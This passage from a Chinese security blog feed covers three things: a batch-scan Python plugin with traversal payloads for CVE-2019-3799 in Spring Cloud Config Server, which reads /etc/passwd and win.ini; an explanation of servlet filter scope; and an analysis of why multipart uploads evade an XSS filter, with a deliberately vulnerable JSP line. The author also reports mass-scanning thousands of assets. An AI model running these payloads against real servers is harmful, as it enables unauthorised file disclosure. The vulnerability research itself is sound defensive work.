&#123;..%252F&#125;*6 + Windows%252Fwin.ini</span><br><span class="line">http://xxx:8888/a/b/master/ + &#123;..%252F&#125;*50 + etc%252Fpasswd</span><br><span class="line">http://xxx:8888/a/b/master/ + &#123;..%252F&#125;*50 + Windows%252Fwin.ini</span><br><span class="line">http://xxx:8888/a/b/c/ + &#123;..%252F&#125;*3 + etc%252Fpasswd?useDefaultLabel=a</span><br><span class="line">http://xxx:8888/a/b/c/ + &#123;..%252F&#125;*7 + Windows%252Fwin.ini?useDefaultLabel=a</span><br><span class="line">http://xxx:8888/a/b/c/ + &#123;..%252F&#125;*50 + etc%252Fpasswd?useDefaultLabel=a</span><br><span class="line">http://xxx:8888/a/b/c/ + &#123;..%252F&#125;*50 + Windows%252Fwin.ini?useDefaultLabel=a</span><br></pre></td></tr></table></figure><h2 id="0x05-批量检测脚本"><a href="#0x05-批量检测脚本" class="headerlink" title="0x05 批量检测脚本"></a>0x05 批量检测脚本</h2><p>下面附上我写的POC-T插件，这里说明下本脚本仅供自查和学习使用，请勿用于非法用途，否则后果自负。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Autor: c0ny1</span></span><br><span class="line"><span class="string">Date: 2019-04-20 16:41</span></span><br><span class="line"><span class="string">Description: Directory Traversal with spring-cloud-config-server(CVE-2019-3799)</span></span><br><span class="line"><span class="string">Affected Pivotal Products and Versions:</span></span><br><span class="line"><span class="string">Spring Cloud Config 2.1.0 to 2.1.1</span></span><br><span class="line"><span class="string">Spring Cloud Config 2.0.0 to 2.0.3</span></span><br><span class="line"><span class="string">Spring Cloud Config 1.4.0 to 1.4.5</span></span><br><span class="line"><span class="string">Older unsupported versions are also affected</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> ConnectionError</span><br><span class="line"></span><br><span class="line">WIN_CHECK_KEYWORD = <span class="string">'[extensions]'</span></span><br><span class="line">LINUX_CHECK_KEYWORD = <span class="string">'root:'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_poc</span><span class="params">()</span>:</span></span><br><span class="line">pocs = []</span><br><span class="line">payload = <span class="string">'/a/b/master/'</span> + <span class="string">'..%252F'</span>*<span class="number">2</span> + <span class="string">'etc%252Fpasswd'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:LINUX_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/master/'</span> + <span class="string">'..%252F'</span>*<span class="number">6</span> + <span class="string">'Windows%252Fwin.ini'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:WIN_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/master/'</span> + <span class="string">'..%252F'</span>*<span class="number">50</span> + <span class="string">'etc%252Fpasswd'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:LINUX_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/master/'</span> + <span class="string">'..%252F'</span>*<span class="number">50</span> + <span class="string">'Windows%252Fwin.ini'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:WIN_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/c/'</span> + <span class="string">'..%252F'</span>*<span class="number">3</span> + <span class="string">'etc%252Fpasswd?useDefaultLabel=a'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:LINUX_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/c/'</span> + <span class="string">'..%252F'</span>*<span class="number">7</span> + <span class="string">'Windows%252Fwin.ini?useDefaultLabel=a'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:WIN_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/c/'</span> + <span class="string">'..%252F'</span>*<span class="number">50</span> + <span class="string">'etc%252Fpasswd?useDefaultLabel=a'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:LINUX_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/c/'</span> + <span class="string">'..%252F'</span>*<span class="number">50</span> + <span class="string">'Windows%252Fwin.ini?useDefaultLabel=a'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:WIN_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"><span class="keyword">return</span> pocs</span><br><span class="line"></span><br><span class="line">pocs = init_poc()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> pocs:</span><br><span class="line">        url = url <span class="keyword">if</span> <span class="keyword">not</span> url.endswith(<span class="string">'/'</span>) <span class="keyword">else</span> url[<span class="number">0</span>:len(url)<span class="number">-1</span>] <span class="comment">#去掉结尾/</span></span><br><span class="line">        target_url = url + p.get(<span class="string">'payload'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(target_url,timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception,e:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (r.status_code == <span class="number">200</span>) <span class="keyword">and</span> (p.get(<span class="string">'keyword'</span>) <span class="keyword">in</span> r.content):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>去参加Avicii的纪念活动之前就挂着扫描，回来发现成果还不错。扫描5815个资产，存在漏洞的有492。最后希望管理员们及时修复吧！</p><p><img src="/articles/2019/write-cve-2019-3799-batch-scan-script/batch_scan_result.png" alt="扫描成果"></p><h2 id="0x06-参考文章"><a href="#0x06-参考文章" class="headerlink" title="0x06 参考文章"></a>0x06 参考文章</h2><ul><li><a href="https://github.com/mpgn/CVE-2019-3799" target="_blank" rel="noopener">https://github.com/mpgn/CVE-2019-3799</a></li><li><a href="https://pivotal.io/security/cve-2019-3799" target="_blank" rel="noopener">https://pivotal.io/security/cve-2019-3799</a></li><li><a href="https://mp.weixin.qq.com/s/roXk5ykq3Jqd4izEOrQ5qw" target="_blank" rel="noopener">Spring Cloud Config Server 路径穿越与任意文件读取漏洞分析 - 【CVE-2019-3799】</a></li><li><a href="https://mp.weixin.qq.com/s/yj0cWEsyiPJr4A7YXpmLJw" target="_blank" rel="noopener">Spring Cloud Config Server 任意文件读取漏洞</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>过滤器作用范围/和/*引发的安全问题</title>
      <link href="/articles/2019/security-raised-by-java-filter-scope-missetting/"/>
      <url>/articles/2019/security-raised-by-java-filter-scope-missetting/</url>
      
        <content type="html"><![CDATA[<p><strong>问题：过滤器作用范围设置为/或/*一样么？</strong></p><p>安全人员可能觉得不一样，毕竟从对通配符的认识来说，<code>/</code>代表的只是根目录，<code>/*</code>代表所有。</p><p>开发人员可能觉得一样，根据平常的开发经验，并未发现两者的差别。</p><p>其实呢，这两种认识都不正确，更确切地说前者说的不够正确。具体许我慢慢道来。</p><h2 id="0x01-问题背景"><a href="#0x01-问题背景" class="headerlink" title="0x01 问题背景"></a>0x01 问题背景</h2><p>回想起之前做的代码审计时，发现项目设置全局过滤器时，有的设置为<code>/</code>，有的设置为<code>/*</code>。<br>在自己模糊印象里，在校学jsp时确实感觉两者是一样的。但作为安全人员，还是不禁好奇，于是查资料写代码实验，终于发现他们的不同。在我明白了它们的不同之后，我调查了下周边做安全和开发的朋友，结果清一色的认为它们一样。</p><h2 id="0x02-实验测试"><a href="#0x02-实验测试" class="headerlink" title="0x02 实验测试"></a>0x02 实验测试</h2><p>我们以防御XSS漏洞的demo来实验，过滤器使用上篇文章的代码。</p><p><strong>存在XSS漏洞的jsp页面代码</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% out.write(request.getParameter(<span class="string">"str"</span>));%&gt;</span><br></pre></td></tr></table></figure><p><strong>web.xml中过滤器配置</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CrossSiteScriptFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>me.gv7.filter.XssFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CrossSiteScriptFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;url-pattern&gt;/*&lt;/url-pattern&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dispatcher</span>&gt;</span>REQUEST<span class="tag">&lt;/<span class="name">dispatcher</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/security-raised-by-java-filter-scope-missetting/show.gif" alt="演示"></p><p>通过演示的结果我们知道：</p><ol><li><code>/*</code>才是真正意义上的过滤所有请求</li><li><code>/</code>并非真正意义上的过滤所有请求，它过滤除jsp页面之外的请求</li></ol><h2 id="0x03-最后总结"><a href="#0x03-最后总结" class="headerlink" title="0x03 最后总结"></a>0x03 最后总结</h2><p>一般项目采用MVC架构之后，基本不会有程序猿继续在jsp文件写后端处理代码。然而这个世界很奇怪，正如墨菲定律说的那样，觉得不可能的往往会发生。而我们更不能把安全寄托于人性上，所以全局安全过滤器请设置作用范围为<code>/*</code>。</p><p>当我们在进行代码审计发现全局过滤器的作用范围为<code>/</code>,则可以着重检查jsp文件中是否包含后端处理代码，毕竟其不在过滤器保护范围内。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>上传包可“绕过”Java过滤器的检查？</title>
      <link href="/articles/2019/why-can-multipart-post-bypass-java-filter/"/>
      <url>/articles/2019/why-can-multipart-post-bypass-java-filter/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-背景说明"><a href="#0x01-背景说明" class="headerlink" title="0x01 背景说明"></a>0x01 背景说明</h2><p>月初和southwind0师傅做代码审计时，发现了一个比较奇葩的问题。系统设置了全局的XSS过滤器，在其他功能点上生效了，但在一个公告发布功能没有被过滤。southwind0师傅通过对比数据包发现公告发布数据包是上传包（也就是我们常见的上传POST请求）。后来我经过编写测试代码，发现过滤器确实无法过滤上传数据包的参数值。</p><p>这让我不禁思考 *”上传包可绕过Java过滤器?”*，如果是真的，那么问题很严重呀，以后过滤器岂不是都可以这样绕过，那这样全局XSS，SQL注入防御过滤器岂不是形同虚设？查了下网上大多数提供XSS过滤器代码基本都存在这个问题，我意识到问题的严重性，打算深入Tomcat和Spring MVC的底层代码一探究竟。</p><h2 id="0x02-测试代码"><a href="#0x02-测试代码" class="headerlink" title="0x02 测试代码"></a>0x02 测试代码</h2><p>由于审计的代码属于敏感信息，我编写了一个和审计场景几乎一样的测试Demo用于本文的研究。测试Demo有get，post和upload页面用于测试Java过滤器对三种类型请求数据包的过滤情况。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/testdemo.png" alt="测试Demo"></p><h4 id="2-1-后端处理代码"><a href="#2-1-后端处理代码" class="headerlink" title="2.1 后端处理代码"></a>2.1 后端处理代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> me.gv7.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/test"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"get"</span>,method = RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">doGet</span><span class="params">(Model model, String str,String bbb)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[+] "</span> + str);</span><br><span class="line">        model.addAttribute(<span class="string">"res"</span>,str);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"get"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"post"</span>,method = RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">post</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"post"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"post"</span>,method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">doPost</span><span class="params">(Model model,String str)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[+] "</span> + str);</span><br><span class="line">        model.addAttribute(<span class="string">"res"</span>,str);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"post"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"upload"</span>,method = RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">upload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"upload"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"upload"</span>,method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">doUpload</span><span class="params">(Model model,String str)</span> </span>&#123;<span class="comment">/*@RequestParam("str") */</span></span><br><span class="line">        System.out.println(<span class="string">"[+] "</span> + str);</span><br><span class="line">        model.addAttribute(<span class="string">"res"</span>,str);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"upload"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-过滤wrapper代码"><a href="#2-2-过滤wrapper代码" class="headerlink" title="2.2 过滤wrapper代码"></a>2.2 过滤wrapper代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> me.gv7.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequestWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XssHttpServletRequestWrapper</span> <span class="keyword">extends</span> <span class="title">HttpServletRequestWrapper</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XssHttpServletRequestWrapper</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String[] getParameterValues(String parameter) &#123;</span><br><span class="line">        String[] values = <span class="keyword">super</span>.getParameterValues(parameter);</span><br><span class="line">        <span class="keyword">if</span> (values==<span class="keyword">null</span>)  &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> count = values.length;</span><br><span class="line">        String[] encodedValues = <span class="keyword">new</span> String[count];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            encodedValues[i] = cleanXSS(values[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> encodedValues;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getParameter</span><span class="params">(String parameter)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String value = <span class="keyword">super</span>.getParameter(parameter);</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cleanXSS(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getHeader</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        String value = <span class="keyword">super</span>.getHeader(name);</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> cleanXSS(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">cleanXSS</span><span class="params">(String value)</span> </span>&#123;</span><br><span class="line">        value = value.replaceAll(<span class="string">"&lt;"</span>, <span class="string">"&amp;lt;"</span>).replaceAll(<span class="string">"&gt;"</span>, <span class="string">"&amp;gt;"</span>);</span><br><span class="line"><span class="comment">//        value = value.replaceAll("\\(", "&amp;#40;").replaceAll("\\)", "&amp;#41;");</span></span><br><span class="line">        value = value.replaceAll(<span class="string">"eval\\((.*)\\)"</span>, <span class="string">""</span>);</span><br><span class="line">        value = value.replaceAll(<span class="string">"alert\\((.*?)\\)"</span>, <span class="string">""</span>);</span><br><span class="line">        value = value.replaceAll(<span class="string">"confirm\\((.*?)\\)"</span>, <span class="string">""</span>);</span><br><span class="line">        value = value.replaceAll(<span class="string">"[\\\"\\\'][\\s]*javascript:(.*)[\\\"\\\']"</span>, <span class="string">"\"\""</span>);</span><br><span class="line">        value = value.replaceAll(<span class="string">"(?i)script"</span>, <span class="string">""</span>);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-全局过滤器设置"><a href="#2-3-全局过滤器设置" class="headerlink" title="2.3 全局过滤器设置"></a>2.3 全局过滤器设置</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>XssFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>me.gv7.filter.XssFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>XssFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dispatcher</span>&gt;</span>REQUEST<span class="tag">&lt;/<span class="name">dispatcher</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>想获取完整代码，请到公众号后台回复”上传包绕Java过滤器测试代码”</p><h2 id="0x03-原理分析"><a href="#0x03-原理分析" class="headerlink" title="0x03 原理分析"></a>0x03 原理分析</h2><p>为了方便描述，我这里将请求分文三种，GET型请求，普通POST型请求和上传POST型请求。本文的普通型POST请求指的是除上传POST型请求之外的POST请求，而上传POST型请求就是我们上传包对应的请求。</p><h4 id="3-1-Spring-MVC如何获取到HTTP请求参数值？"><a href="#3-1-Spring-MVC如何获取到HTTP请求参数值？" class="headerlink" title="3.1 Spring MVC如何获取到HTTP请求参数值？"></a>3.1 Spring MVC如何获取到HTTP请求参数值？</h4><p>为了更透彻的理解出现该问题的原因，我们需要搞清楚Spring MVC框架是如何获取到前端传来的HTTP请求的参数值。</p><p>前端提交的请求会先到达Tomcat服务器，其解析请求参数主要在<code>Request.parseParameters()</code>中进行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.connector.Request</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">parseParameters</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.parametersParsed = <span class="keyword">true</span>;</span><br><span class="line">Parameters parameters = <span class="keyword">this</span>.coyoteRequest.getParameters();</span><br><span class="line"><span class="keyword">boolean</span> success = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">parameters.setLimit(<span class="keyword">this</span>.getConnector().getMaxParameterCount());</span><br><span class="line">...</span><br><span class="line">parameters.handleQueryParameters();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.usingInputStream || <span class="keyword">this</span>.usingReader) &#123;</span><br><span class="line">success = <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.getConnector().isParseBodyMethod(<span class="keyword">this</span>.getMethod())) &#123;</span><br><span class="line">success = <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 获取请求包ContentType头</span></span><br><span class="line">String contentType = <span class="keyword">this</span>.getContentType();</span><br><span class="line">...</span><br><span class="line"><span class="comment">// 如果请求ContentType为multipart/form-data，也就是上传POST</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">"multipart/form-data"</span>.equals(contentType)) &#123;</span><br><span class="line"><span class="comment">//对上传包进行解析</span></span><br><span class="line"><span class="keyword">this</span>.parseParts();</span><br><span class="line">success = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="string">"application/x-www-form-urlencoded"</span>.equals(contentType)) &#123;</span><br><span class="line">success = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> len = <span class="keyword">this</span>.getContentLength();</span><br><span class="line">...</span><br><span class="line">parameters.processParameters(formData, <span class="number">0</span>, len);</span><br><span class="line">...</span><br><span class="line">success = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span 